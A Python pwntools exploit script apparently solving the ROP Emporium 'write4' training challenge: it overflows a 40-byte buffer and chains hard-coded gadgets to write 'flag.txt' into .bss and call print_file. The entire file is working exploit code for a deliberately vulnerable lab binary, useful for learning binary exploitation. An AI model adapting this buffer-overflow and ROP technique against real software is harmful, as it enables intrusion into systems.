import pwn

#pwn.context.log_level = "debug"
pwn.context.arch = 'amd64'
remote = False

IP = ""
PORT = ""
FILENAME = "./write4"

if remote:
    p = pwn.remote(IP, PORT)
    elf = pwn.ELF(FILENAME)
else:
    p = pwn.process(FILENAME)
    elf = p.elf

# move txt.galf into bss_start
pop_r14_r15 = pwn.pack(0x0000000000400690) # pop r14; pop r15; ret;
mov_qword = pwn.pack(0x0000000000400628) # mov qword ptr [r14], r15; ret;
pop_rdi = pwn.pack(0x0000000000400693) # pop rdi; ret;
bss = pwn.pack(0x00601040) # __bss_start
print_file = pwn.pack(elf.sym['print_file'])
p.recvuntil(">")

rop = pwn.ROP(elf)
rop.call(pop_r14_r15)
rop.call(bss)
rop.call(0x7478742e67616c66)
rop.call(mov_qword)
rop.call(pop_rdi)
rop.call(bss)
rop.call(print_file)

payload = b"A"*40 + rop.chain()
#payload = b"A"*40 +\
#          pop_r14_r15 +\
#          bss +\
#          pwn.pack(0x7478742e67616c66) +\
#          mov_qword +\
#          pop_rdi +\
#          bss +\
#          print_file

p.sendline(payload)

p.interactive()
